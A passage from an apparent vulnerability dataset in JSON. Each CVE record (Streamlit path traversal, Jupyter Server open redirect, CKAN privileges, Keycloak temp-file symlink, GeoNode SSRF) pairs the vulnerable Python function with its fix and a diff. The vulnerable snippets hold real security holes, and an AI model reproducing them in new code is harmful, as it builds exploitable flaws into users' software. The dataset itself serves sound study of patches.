        "file_path": "lib/streamlit/components/v1/components.py",
        "start_line": 310,
        "end_line": 336,
        "snippet": "    def get(self, path: str) -> None:\n        parts = path.split(\"/\")\n        component_name = parts[0]\n        component_root = self._registry.get_component_path(component_name)\n        if component_root is None:\n            self.write(\"not found\")\n            self.set_status(404)\n            return\n\n        filename = \"/\".join(parts[1:])\n        abspath = os.path.join(component_root, filename)\n\n        LOGGER.debug(\"ComponentRequestHandler: GET: %s -> %s\", path, abspath)\n\n        try:\n            with open(abspath, \"rb\") as file:\n                contents = file.read()\n        except (OSError) as e:\n            LOGGER.error(f\"ComponentRequestHandler: GET {path} read error\", exc_info=e)\n            self.write(\"read error\")\n            self.set_status(404)\n            return\n\n        self.write(contents)\n        self.set_header(\"Content-Type\", self.get_content_type(abspath))\n\n        self.set_extra_headers(path)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_380_1",
        "commit": "80d9979d5f4a00217743d607078a1d867fad8acf",
        "file_path": "lib/streamlit/components/v1/components.py",
        "start_line": 310,
        "end_line": 344,
        "snippet": "    def get(self, path: str) -> None:\n        parts = path.split(\"/\")\n        component_name = parts[0]\n        component_root = self._registry.get_component_path(component_name)\n        if component_root is None:\n            self.write(\"not found\")\n            self.set_status(404)\n            return\n\n        # follow symlinks to get an accurate normalized path\n        component_root = os.path.realpath(component_root)\n        filename = \"/\".join(parts[1:])\n        abspath = os.path.realpath(os.path.join(component_root, filename))\n\n        # Do NOT expose anything outside of the component root.\n        if os.path.commonprefix([component_root, abspath]) != component_root:\n            self.write(\"forbidden\")\n            self.set_status(403)\n            return\n\n        LOGGER.debug(\"ComponentRequestHandler: GET: %s -> %s\", path, abspath)\n\n        try:\n            with open(abspath, \"rb\") as file:\n                contents = file.read()\n        except (OSError) as e:\n            LOGGER.error(f\"ComponentRequestHandler: GET {path} read error\", exc_info=e)\n            self.write(\"read error\")\n            self.set_status(404)\n            return\n\n        self.write(contents)\n        self.set_header(\"Content-Type\", self.get_content_type(abspath))\n\n        self.set_extra_headers(path)"
      }
    ],
    "vul_patch": "--- a/lib/streamlit/components/v1/components.py\n+++ b/lib/streamlit/components/v1/components.py\n@@ -7,8 +7,16 @@\n             self.set_status(404)\n             return\n \n+        # follow symlinks to get an accurate normalized path\n+        component_root = os.path.realpath(component_root)\n         filename = \"/\".join(parts[1:])\n-        abspath = os.path.join(component_root, filename)\n+        abspath = os.path.realpath(os.path.join(component_root, filename))\n+\n+        # Do NOT expose anything outside of the component root.\n+        if os.path.commonprefix([component_root, abspath]) != component_root:\n+            self.write(\"forbidden\")\n+            self.set_status(403)\n+            return\n \n         LOGGER.debug(\"ComponentRequestHandler: GET: %s -> %s\", path, abspath)\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-26275",
    "cve_description": "The Jupyter Server provides the backend (i.e. the core services, APIs, and REST endpoints) for Jupyter web applications like Jupyter notebook, JupyterLab, and Voila. In Jupyter Server before version 1.1.1, an open redirect vulnerability could cause the jupyter server to redirect the browser to a different malicious website. All jupyter servers running without a base_url prefix are technically affected, however, these maliciously crafted links can only be reasonably made for known jupyter server hosts. A link to your jupyter server may *appear* safe, but ultimately redirect to a spoofed server on the public internet. This same vulnerability was patched in upstream notebook v5.7.8. This is fixed in jupyter_server 1.1.1. If upgrade is not available, a workaround can be to run your server on a url prefix: \"jupyter server --ServerApp.base_url=/jupyter/\".",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/jupyter-server/jupyter_server",
    "patch_url": [
      "https://github.com/jupyter-server/jupyter_server/commit/85e4abccf6ea9321d29153f73b0bd72ccb3a6bca"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_388_1",
        "commit": "b328e0a98fa553d3ec4cd911b6d11bb7363ddb0f",
        "file_path": "jupyter_server/auth/login.py",
        "start_line": 30,
        "end_line": 55,
        "snippet": "    def _redirect_safe(self, url, default=None):\n        \"\"\"Redirect if url is on our PATH\n\n        Full-domain redirects are allowed if they pass our CORS origin checks.\n\n        Otherwise use default (self.base_url if unspecified).\n        \"\"\"\n        if default is None:\n            default = self.base_url\n        if not url.startswith(self.base_url):\n            # require that next_url be absolute path within our path\n            allow = False\n            # OR pass our cross-origin check\n            if '://' in url:\n                # if full URL, run our cross-origin check:\n                parsed = urlparse(url.lower())\n                origin = '%s://%s' % (parsed.scheme, parsed.netloc)\n                if self.allow_origin:\n                    allow = self.allow_origin == origin\n                elif self.allow_origin_pat:\n                    allow = bool(self.allow_origin_pat.match(origin))\n            if not allow:\n                # not allowed, use default\n                self.log.warning(\"Not allowing login redirect to %r\" % url)\n                url = default\n        self.redirect(url)"
      },
      {
        "id": "vul_py_388_2",
        "commit": "b328e0a98fa553d3ec4cd911b6d11bb7363ddb0f",
        "file_path": "jupyter_server/auth/login.py",
        "start_line": 71,
        "end_line": 92,
        "snippet": "    def post(self):\n        typed_password = self.get_argument('password', default=u'')\n        new_password = self.get_argument('new_password', default=u'')\n\n        if self.get_login_available(self.settings):\n            if self.passwd_check(self.hashed_password, typed_password) and not new_password:\n                self.set_login_cookie(self, uuid.uuid4().hex)\n            elif self.token and self.token == typed_password:\n                self.set_login_cookie(self, uuid.uuid4().hex)\n                if new_password and self.settings.get('allow_password_change'):\n                    config_dir = self.settings.get('config_dir')\n                    config_file = os.path.join(config_dir, 'jupyter_server_config.json')\n                    set_password(new_password, config_file=config_file)\n                    self.log.info(\"Wrote hashed password to %s\" % config_file)\n            else:\n                self.set_status(401)\n                self._render(message={'error': 'Invalid credentials'})\n                return\n\n\n        next_url = self.get_argument('next', default=self.base_url)\n        self._redirect_safe(next_url)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_388_1",
        "commit": "85e4abccf6ea9321d29153f73b0bd72ccb3a6bca",
        "file_path": "jupyter_server/auth/login.py",
        "start_line": 30,
        "end_line": 60,
        "snippet": "    def _redirect_safe(self, url, default=None):\n        \"\"\"Redirect if url is on our PATH\n\n        Full-domain redirects are allowed if they pass our CORS origin checks.\n\n        Otherwise use default (self.base_url if unspecified).\n        \"\"\"\n        if default is None:\n            default = self.base_url\n        # protect chrome users from mishandling unescaped backslashes.\n        # \\ is not valid in urls, but some browsers treat it as /\n        # instead of %5C, causing `\\\\` to behave as `//`\n        url = url.replace(\"\\\\\", \"%5C\")\n        parsed = urlparse(url)\n        if parsed.netloc or not (parsed.path + \"/\").startswith(self.base_url):\n            # require that next_url be absolute path within our path\n            allow = False\n            # OR pass our cross-origin check\n            if parsed.netloc:\n                # if full URL, run our cross-origin check:\n                origin = '%s://%s' % (parsed.scheme, parsed.netloc)\n                origin = origin.lower()\n                if self.allow_origin:\n                    allow = self.allow_origin == origin\n                elif self.allow_origin_pat:\n                    allow = bool(self.allow_origin_pat.match(origin))\n            if not allow:\n                # not allowed, use default\n                self.log.warning(\"Not allowing login redirect to %r\" % url)\n                url = default\n        self.redirect(url)"
      },
      {
        "id": "fix_py_388_2",
        "commit": "85e4abccf6ea9321d29153f73b0bd72ccb3a6bca",
        "file_path": "jupyter_server/auth/login.py",
        "start_line": 76,
        "end_line": 99,
        "snippet": "    def post(self):\n        typed_password = self.get_argument('password', default=u'')\n        new_password = self.get_argument('new_password', default=u'')\n\n        if self.get_login_available(self.settings):\n            if self.passwd_check(self.hashed_password, typed_password) and not new_password:\n                self.set_login_cookie(self, uuid.uuid4().hex)\n            elif self.token and self.token == typed_password:\n                self.set_login_cookie(self, uuid.uuid4().hex)\n                if new_password and self.settings.get(\"allow_password_change\"):\n                    config_dir = self.settings.get(\"config_dir\")\n                    config_file = os.path.join(\n                        config_dir, \"jupyter_notebook_config.json\"\n                    )\n                    set_password(new_password, config_file=config_file)\n                    self.log.info(\"Wrote hashed password to %s\" % config_file)\n            else:\n                self.set_status(401)\n                self._render(message={'error': 'Invalid credentials'})\n                return\n\n\n        next_url = self.get_argument('next', default=self.base_url)\n        self._redirect_safe(next_url)"
      }
    ],
    "vul_patch": "--- a/jupyter_server/auth/login.py\n+++ b/jupyter_server/auth/login.py\n@@ -7,14 +7,19 @@\n         \"\"\"\n         if default is None:\n             default = self.base_url\n-        if not url.startswith(self.base_url):\n+        # protect chrome users from mishandling unescaped backslashes.\n+        # \\ is not valid in urls, but some browsers treat it as /\n+        # instead of %5C, causing `\\\\` to behave as `//`\n+        url = url.replace(\"\\\\\", \"%5C\")\n+        parsed = urlparse(url)\n+        if parsed.netloc or not (parsed.path + \"/\").startswith(self.base_url):\n             # require that next_url be absolute path within our path\n             allow = False\n             # OR pass our cross-origin check\n-            if '://' in url:\n+            if parsed.netloc:\n                 # if full URL, run our cross-origin check:\n-                parsed = urlparse(url.lower())\n                 origin = '%s://%s' % (parsed.scheme, parsed.netloc)\n+                origin = origin.lower()\n                 if self.allow_origin:\n                     allow = self.allow_origin == origin\n                 elif self.allow_origin_pat:\n\n--- a/jupyter_server/auth/login.py\n+++ b/jupyter_server/auth/login.py\n@@ -7,9 +7,11 @@\n                 self.set_login_cookie(self, uuid.uuid4().hex)\n             elif self.token and self.token == typed_password:\n                 self.set_login_cookie(self, uuid.uuid4().hex)\n-                if new_password and self.settings.get('allow_password_change'):\n-                    config_dir = self.settings.get('config_dir')\n-                    config_file = os.path.join(config_dir, 'jupyter_server_config.json')\n+                if new_password and self.settings.get(\"allow_password_change\"):\n+                    config_dir = self.settings.get(\"config_dir\")\n+                    config_file = os.path.join(\n+                        config_dir, \"jupyter_notebook_config.json\"\n+                    )\n                     set_password(new_password, config_file=config_file)\n                     self.log.info(\"Wrote hashed password to %s\" % config_file)\n             else:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-32696",
    "cve_description": "CKAN is an open-source data management system for powering data hubs and data portals. Prior to versions 2.9.9 and 2.10.1, the `ckan` user (equivalent to www-data) owned code and configuration files in the docker container and the `ckan` user had the permissions to use sudo. These issues allowed for code execution or privilege escalation if an arbitrary file write bug was available. Versions 2.9.9, 2.9.9-dev, 2.10.1, and 2.10.1-dev contain a patch.\n\n\n\n",
    "cwe_info": {
      "CWE-269": {
        "name": "Improper Privilege Management",
        "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
      }
    },
    "repo": "https://github.com/ckan/ckan-docker-base",
    "patch_url": [
      "https://github.com/ckan/ckan-docker-base/commit/5483c46ce9b518a4e1b626ef7032cce2c1d75c7d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_236_1",
        "commit": "f145acd",
        "file_path": "ckan-2.10/base/setup/prerun.py",
        "start_line": 160,
        "end_line": 196,
        "snippet": "def create_sysadmin():\n\n    name = os.environ.get(\"CKAN_SYSADMIN_NAME\")\n    password = os.environ.get(\"CKAN_SYSADMIN_PASSWORD\")\n    email = os.environ.get(\"CKAN_SYSADMIN_EMAIL\")\n\n    if name and password and email:\n\n        # Check if user exists\n        command = [\"ckan\", \"-c\", ckan_ini, \"user\", \"show\", name]\n\n        out = subprocess.check_output(command)\n        if b\"User:None\" not in re.sub(b\"\\s\", b\"\", out):\n            print(\"[prerun] Sysadmin user exists, skipping creation\")\n            return\n\n        # Create user\n        command = [\n            \"ckan\",\n            \"-c\",\n            ckan_ini,\n            \"user\",\n            \"add\",\n            name,\n            \"password=\" + password,\n            \"email=\" + email,\n        ]\n\n        subprocess.call(command)\n        print(\"[prerun] Created user {0}\".format(name))\n\n        # Make it sysadmin\n        command = [\"ckan\", \"-c\", ckan_ini, \"sysadmin\", \"add\", name]\n\n        subprocess.call(command)\n        print(\"[prerun] Made user {0} a sysadmin\".format(name))\n"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_236_1",
        "commit": "5483c46",
        "file_path": "ckan-2.10/base/setup/prerun.py",
        "start_line": 160,
        "end_line": 203,
        "snippet": "def create_sysadmin():\n\n    name = os.environ.get(\"CKAN_SYSADMIN_NAME\")\n    password = os.environ.get(\"CKAN_SYSADMIN_PASSWORD\")\n    email = os.environ.get(\"CKAN_SYSADMIN_EMAIL\")\n\n    if name and password and email:\n\n        # Check if user exists\n        command = [\"ckan\", \"-c\", ckan_ini, \"user\", \"show\", name]\n\n        out = subprocess.check_output(command)\n        if b\"User:None\" not in re.sub(b\"\\s\", b\"\", out):\n            print(\"[prerun] Sysadmin user exists, skipping creation\")\n            return\n\n        # Create user\n        command = [\n            \"ckan\",\n            \"-c\",\n            ckan_ini,\n            \"user\",\n            \"add\",\n            name,\n            \"password=\" + password,\n            \"email=\" + email,\n        ]\n\n        subprocess.call(command)\n        print(\"[prerun] Created user {0}\".format(name))\n\n        # Make it sysadmin\n        command = [\"ckan\", \"-c\", ckan_ini, \"sysadmin\", \"add\", name]\n\n        subprocess.call(command)\n        print(\"[prerun] Made user {0} a sysadmin\".format(name))\n\n        # cleanup permissions\n        # We're running as root before pivoting to uwsgi and dropping privs\n        data_dir = \"%s/storage\" % os.environ['CKAN_STORAGE_PATH']\n\n        command = [\"chown\", \"-R\", \"ckan:ckan\", data_dir]\n        subprocess.call(command)\n        print(\"[prerun] Ensured storage directory is owned by ckan\")"
      }
    ],
    "vul_patch": "--- a/ckan-2.10/base/setup/prerun.py\n+++ b/ckan-2.10/base/setup/prerun.py\n@@ -34,3 +34,11 @@\n \n         subprocess.call(command)\n         print(\"[prerun] Made user {0} a sysadmin\".format(name))\n+\n+        # cleanup permissions\n+        # We're running as root before pivoting to uwsgi and dropping privs\n+        data_dir = \"%s/storage\" % os.environ['CKAN_STORAGE_PATH']\n+\n+        command = [\"chown\", \"-R\", \"ckan:ckan\", data_dir]\n+        subprocess.call(command)\n+        print(\"[prerun] Ensured storage directory is owned by ckan\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2017-15111",
    "cve_description": "keycloak-httpd-client-install versions before 0.8 insecurely creates temporary file allowing local attackers to overwrite other files via symbolic link.",
    "cwe_info": {
      "CWE-59": {
        "name": "Improper Link Resolution Before File Access ('Link Following')",
        "description": "The product attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource."
      }
    },
    "repo": "https://github.com/jdennis/keycloak-httpd-client-install",
    "patch_url": [
      "https://github.com/jdennis/keycloak-httpd-client-install/commit/07f26e213196936fb328ea0c1d5a66a09d8b5440"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_84_1",
        "commit": "c3121b2",
        "file_path": "keycloak_httpd_client/keycloak_cli.py",
        "start_line": "846",
        "end_line": "1045",
        "snippet": "def main():\n    global logger\n    result = 0\n\n    parser = argparse.ArgumentParser(description='Keycloak REST client',\n                    prog=prog_name,\n                    epilog=verbose_help.format(prog_name=prog_name),\n                    formatter_class=argparse.RawDescriptionHelpFormatter)\n\n    parser.add_argument('-v', '--verbose', action='store_true',\n                        help='be chatty')\n\n    parser.add_argument('-d', '--debug', action='store_true',\n                        help='turn on debug info')\n\n    parser.add_argument('--show-traceback', action='store_true',\n                        help='exceptions print traceback in addition to '\n                             'error message')\n\n    parser.add_argument('--log-file',\n                        default='/tmp/{prog_name}.log'.format(\n                            prog_name=prog_name),\n                        help='log file pathname')\n\n    parser.add_argument('--permit-insecure-transport',  action='store_true',\n                        help='Normally secure transport such as TLS '\n                        'is required, defeat this check')\n\n    parser.add_argument('--tls-verify', action=TlsVerifyAction,\n                        default=True,\n                        help='TLS certificate verification for requests to'\n                        ' the server. May be one of case insenstive '\n                        '[true, yes, on] to enable,'\n                        '[false, no, off] to disable.'\n                        'Or the pathname to a OpenSSL CA bundle to use.'\n                        ' Default is True.')\n\n    group = parser.add_argument_group('Server')\n\n    group.add_argument('-s', '--server',\n                       required=True,\n                       help='DNS name or IP address of Keycloak server')\n\n    group.add_argument('-a', '--auth-role',\n                       choices=AUTH_ROLES,\n                       default='root-admin',\n                       help='authenticating as what type of user (default: root-admin)')\n\n    group.add_argument('-u', '--admin-username',\n                       default='admin',\n                       help='admin user name (default: admin)')\n\n    group.add_argument('-P', '--admin-password-file',\n                       type=argparse.FileType('rb'),\n                       help=('file containing admin password '\n                             '(or use a hyphen \"-\" to read the password '\n                             'from stdin)'))\n\n    group.add_argument('--admin-realm',\n                       default='master',\n                       help='realm admin belongs to')\n\n    cmd_parsers = parser.add_subparsers(help='available commands')\n\n    # --- realm commands ---\n    realm_parser = cmd_parsers.add_parser('realm',\n                                          help='realm operations')\n\n    sub_parser = realm_parser.add_subparsers(help='realm commands')\n\n    cmd_parser = sub_parser.add_parser('server_info',\n                                       help='dump server info')\n    cmd_parser.set_defaults(func=do_server_info)\n\n    cmd_parser = sub_parser.add_parser('list',\n                                       help='list realm names')\n    cmd_parser.set_defaults(func=do_list_realms)\n\n    cmd_parser = sub_parser.add_parser('create',\n                                       help='create new realm')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n    cmd_parser.set_defaults(func=do_create_realm)\n\n    cmd_parser = sub_parser.add_parser('delete',\n                                       help='delete existing realm')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n    cmd_parser.set_defaults(func=do_delete_realm)\n\n    cmd_parser = sub_parser.add_parser('metadata',\n                                       help='retrieve realm metadata')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n    cmd_parser.set_defaults(func=do_get_realm_metadata)\n\n    # --- client commands ---\n    client_parser = cmd_parsers.add_parser('client',\n                                           help='client operations')\n\n    sub_parser = client_parser.add_subparsers(help='client commands')\n\n    cmd_parser = sub_parser.add_parser('list',\n                                       help='list client names')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n\n    cmd_parser.set_defaults(func=do_list_clients)\n\n    cmd_parser = sub_parser.add_parser('create',\n                                       help='create new client')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n    cmd_parser.add_argument('-m', '--metadata', type=argparse.FileType('rb'),\n                            required=True,\n                            help='SP metadata file or stdin')\n    cmd_parser.set_defaults(func=do_create_client)\n\n    cmd_parser = sub_parser.add_parser('register',\n                                       help='register new client')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n    cmd_parser.add_argument('-m', '--metadata', type=argparse.FileType('rb'),\n                            required=True,\n                            help='SP metadata file or stdin')\n    cmd_parser.add_argument('--initial-access-token', required=True,\n                            help='realm initial access token for '\n                            'client registeration')\n    cmd_parser.set_defaults(func=do_register_client)\n\n    cmd_parser = sub_parser.add_parser('delete',\n                                       help='delete existing client')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n    cmd_parser.add_argument('-c', '--client-name', required=True,\n                            help='client name')\n    cmd_parser.set_defaults(func=do_delete_client)\n\n    cmd_parser = sub_parser.add_parser('test',\n                                       help='experimental test used during '\n                                       'development')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n    cmd_parser.add_argument('-c', '--client-name', required=True,\n                            help='client name')\n    cmd_parser.set_defaults(func=do_client_test)\n\n    # Process command line arguments\n    options = parser.parse_args()\n    configure_logging(options)\n\n    if options.permit_insecure_transport:\n        os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'\n\n    # Get admin password\n    options.admin_password = None\n\n    # 1. Try password file\n    if options.admin_password_file is not None:\n        options.admin_password = options.keycloak_admin_password_file.readline().strip()\n        options.keycloak_admin_password_file.close()\n\n    # 2. Try KEYCLOAK_ADMIN_PASSWORD environment variable\n    if options.admin_password is None:\n        if (('KEYCLOAK_ADMIN_PASSWORD' in os.environ) and\n            (os.environ['KEYCLOAK_ADMIN_PASSWORD'])):\n            options.admin_password = os.environ['KEYCLOAK_ADMIN_PASSWORD']\n\n    try:\n        anonymous_conn = KeycloakAnonymousConnection(options.server,\n                                                     options.tls_verify)\n\n        admin_conn = KeycloakAdminConnection(options.server,\n                                             options.auth_role,\n                                             options.admin_realm,\n                                             ADMIN_CLIENT_ID,\n                                             options.admin_username,\n                                             options.admin_password,\n                                             options.tls_verify)\n    except Exception as e:\n        if options.show_traceback:\n            traceback.print_exc()\n        print(six.text_type(e), file=sys.stderr)\n        result = 1\n        return result\n\n    try:\n        if options.func == do_register_client:\n            conn = admin_conn\n        else:\n            conn = admin_conn\n        result = options.func(options, conn)\n    except Exception as e:\n        if options.show_traceback:\n            traceback.print_exc()\n        print(six.text_type(e), file=sys.stderr)\n        result = 2\n        return result\n\n    return result"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_84_1",
        "commit": "07f26e2",
        "file_path": "keycloak_httpd_client/keycloak_cli.py",
        "start_line": "846",
        "end_line": "1045",
        "snippet": "def main():\n    global logger\n    result = 0\n\n    parser = argparse.ArgumentParser(description='Keycloak REST client',\n                    prog=prog_name,\n                    epilog=verbose_help.format(prog_name=prog_name),\n                    formatter_class=argparse.RawDescriptionHelpFormatter)\n\n    parser.add_argument('-v', '--verbose', action='store_true',\n                        help='be chatty')\n\n    parser.add_argument('-d', '--debug', action='store_true',\n                        help='turn on debug info')\n\n    parser.add_argument('--show-traceback', action='store_true',\n                        help='exceptions print traceback in addition to '\n                             'error message')\n\n    parser.add_argument('--log-file',\n                        default='{prog_name}.log'.format(\n                            prog_name=prog_name),\n                        help='log file pathname')\n\n    parser.add_argument('--permit-insecure-transport',  action='store_true',\n                        help='Normally secure transport such as TLS '\n                        'is required, defeat this check')\n\n    parser.add_argument('--tls-verify', action=TlsVerifyAction,\n                        default=True,\n                        help='TLS certificate verification for requests to'\n                        ' the server. May be one of case insenstive '\n                        '[true, yes, on] to enable,'\n                        '[false, no, off] to disable.'\n                        'Or the pathname to a OpenSSL CA bundle to use.'\n                        ' Default is True.')\n\n    group = parser.add_argument_group('Server')\n\n    group.add_argument('-s', '--server',\n                       required=True,\n                       help='DNS name or IP address of Keycloak server')\n\n    group.add_argument('-a', '--auth-role',\n                       choices=AUTH_ROLES,\n                       default='root-admin',\n                       help='authenticating as what type of user (default: root-admin)')\n\n    group.add_argument('-u', '--admin-username',\n                       default='admin',\n                       help='admin user name (default: admin)')\n\n    group.add_argument('-P', '--admin-password-file',\n                       type=argparse.FileType('rb'),\n                       help=('file containing admin password '\n                             '(or use a hyphen \"-\" to read the password '\n                             'from stdin)'))\n\n    group.add_argument('--admin-realm',\n                       default='master',\n                       help='realm admin belongs to')\n\n    cmd_parsers = parser.add_subparsers(help='available commands')\n\n    # --- realm commands ---\n    realm_parser = cmd_parsers.add_parser('realm',\n                                          help='realm operations')\n\n    sub_parser = realm_parser.add_subparsers(help='realm commands')\n\n    cmd_parser = sub_parser.add_parser('server_info',\n                                       help='dump server info')\n    cmd_parser.set_defaults(func=do_server_info)\n\n    cmd_parser = sub_parser.add_parser('list',\n                                       help='list realm names')\n    cmd_parser.set_defaults(func=do_list_realms)\n\n    cmd_parser = sub_parser.add_parser('create',\n                                       help='create new realm')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n    cmd_parser.set_defaults(func=do_create_realm)\n\n    cmd_parser = sub_parser.add_parser('delete',\n                                       help='delete existing realm')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n    cmd_parser.set_defaults(func=do_delete_realm)\n\n    cmd_parser = sub_parser.add_parser('metadata',\n                                       help='retrieve realm metadata')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n    cmd_parser.set_defaults(func=do_get_realm_metadata)\n\n    # --- client commands ---\n    client_parser = cmd_parsers.add_parser('client',\n                                           help='client operations')\n\n    sub_parser = client_parser.add_subparsers(help='client commands')\n\n    cmd_parser = sub_parser.add_parser('list',\n                                       help='list client names')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n\n    cmd_parser.set_defaults(func=do_list_clients)\n\n    cmd_parser = sub_parser.add_parser('create',\n                                       help='create new client')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n    cmd_parser.add_argument('-m', '--metadata', type=argparse.FileType('rb'),\n                            required=True,\n                            help='SP metadata file or stdin')\n    cmd_parser.set_defaults(func=do_create_client)\n\n    cmd_parser = sub_parser.add_parser('register',\n                                       help='register new client')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n    cmd_parser.add_argument('-m', '--metadata', type=argparse.FileType('rb'),\n                            required=True,\n                            help='SP metadata file or stdin')\n    cmd_parser.add_argument('--initial-access-token', required=True,\n                            help='realm initial access token for '\n                            'client registeration')\n    cmd_parser.set_defaults(func=do_register_client)\n\n    cmd_parser = sub_parser.add_parser('delete',\n                                       help='delete existing client')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n    cmd_parser.add_argument('-c', '--client-name', required=True,\n                            help='client name')\n    cmd_parser.set_defaults(func=do_delete_client)\n\n    cmd_parser = sub_parser.add_parser('test',\n                                       help='experimental test used during '\n                                       'development')\n    cmd_parser.add_argument('-r', '--realm-name', required=True,\n                            help='realm name')\n    cmd_parser.add_argument('-c', '--client-name', required=True,\n                            help='client name')\n    cmd_parser.set_defaults(func=do_client_test)\n\n    # Process command line arguments\n    options = parser.parse_args()\n    configure_logging(options)\n\n    if options.permit_insecure_transport:\n        os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'\n\n    # Get admin password\n    options.admin_password = None\n\n    # 1. Try password file\n    if options.admin_password_file is not None:\n        options.admin_password = options.keycloak_admin_password_file.readline().strip()\n        options.keycloak_admin_password_file.close()\n\n    # 2. Try KEYCLOAK_ADMIN_PASSWORD environment variable\n    if options.admin_password is None:\n        if (('KEYCLOAK_ADMIN_PASSWORD' in os.environ) and\n            (os.environ['KEYCLOAK_ADMIN_PASSWORD'])):\n            options.admin_password = os.environ['KEYCLOAK_ADMIN_PASSWORD']\n\n    try:\n        anonymous_conn = KeycloakAnonymousConnection(options.server,\n                                                     options.tls_verify)\n\n        admin_conn = KeycloakAdminConnection(options.server,\n                                             options.auth_role,\n                                             options.admin_realm,\n                                             ADMIN_CLIENT_ID,\n                                             options.admin_username,\n                                             options.admin_password,\n                                             options.tls_verify)\n    except Exception as e:\n        if options.show_traceback:\n            traceback.print_exc()\n        print(six.text_type(e), file=sys.stderr)\n        result = 1\n        return result\n\n    try:\n        if options.func == do_register_client:\n            conn = admin_conn\n        else:\n            conn = admin_conn\n        result = options.func(options, conn)\n    except Exception as e:\n        if options.show_traceback:\n            traceback.print_exc()\n        print(six.text_type(e), file=sys.stderr)\n        result = 2\n        return result\n\n    return result"
      }
    ],
    "vul_patch": "--- a/keycloak_httpd_client/keycloak_cli.py\n+++ b/keycloak_httpd_client/keycloak_cli.py\n@@ -18,7 +18,7 @@\n                              'error message')\n \n     parser.add_argument('--log-file',\n-                        default='/tmp/{prog_name}.log'.format(\n+                        default='{prog_name}.log'.format(\n                             prog_name=prog_name),\n                         help='log file pathname')\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-40017",
    "cve_description": "GeoNode is an open source platform that facilitates the creation, sharing, and collaborative use of geospatial data. In versions 3.2.0 through 4.1.2, the endpoint `/proxy/?url=` does not properly protect against server-side request forgery. This allows an attacker to port scan internal hosts and request information from internal hosts. A patch is available at commit a9eebae80cb362009660a1fd49e105e7cdb499b9.",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/GeoNode/geonode",
    "patch_url": [
      "https://github.com/GeoNode/geonode/commit/a9eebae80cb362009660a1fd49e105e7cdb499b9"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_160_1",
        "commit": "618776e",
        "file_path": "geonode/proxy/tests.py",
        "start_line": 63,
        "end_line": 261,
        "snippet": "        self.maxDiff = None\n        self.admin = get_user_model().objects.get(username=\"admin\")\n\n        # FIXME(Ariel): These tests do not work when the computer is offline.\n        self.proxy_url = \"/proxy/\"\n        self.url = TEST_URL\n\n    @override_settings(DEBUG=True, PROXY_ALLOWED_HOSTS=())\n    def test_validate_host_disabled_in_debug(self):\n        \"\"\"If PROXY_ALLOWED_HOSTS is empty and DEBUG is True, all hosts pass the proxy.\"\"\"\n        response = self.client.get(f\"{self.proxy_url}?url={self.url}\")\n        if response.status_code != 404:  # 404 - NOT FOUND\n            self.assertTrue(response.status_code in (200, 301), response.status_code)\n\n    @override_settings(DEBUG=False, PROXY_ALLOWED_HOSTS=())\n    def test_validate_host_disabled_not_in_debug(self):\n        \"\"\"If PROXY_ALLOWED_HOSTS is empty and DEBUG is False requests should return 403.\"\"\"\n        response = self.client.get(f\"{self.proxy_url}?url={self.url}\")\n        if response.status_code != 404:  # 404 - NOT FOUND\n            self.assertEqual(response.status_code, 403, response.status_code)\n\n    @override_settings(DEBUG=False, PROXY_ALLOWED_HOSTS=(TEST_DOMAIN,))\n    def test_proxy_allowed_host(self):\n        \"\"\"If PROXY_ALLOWED_HOSTS is not empty and DEBUG is False requests should return no error.\"\"\"\n        self.client.login(username=\"admin\", password=\"admin\")\n        response = self.client.get(f\"{self.proxy_url}?url={self.url}\")\n        if response.status_code != 404:  # 404 - NOT FOUND\n            self.assertEqual(response.status_code, 200, response.status_code)\n\n    @override_settings(DEBUG=False, PROXY_ALLOWED_HOSTS=())\n    def test_validate_remote_services_hosts(self):\n        \"\"\"If PROXY_ALLOWED_HOSTS is empty and DEBUG is False requests should return 200\n        for Remote Services hosts.\"\"\"\n        from geonode.services.models import Service\n        from geonode.services.enumerations import WMS, INDEXED\n\n     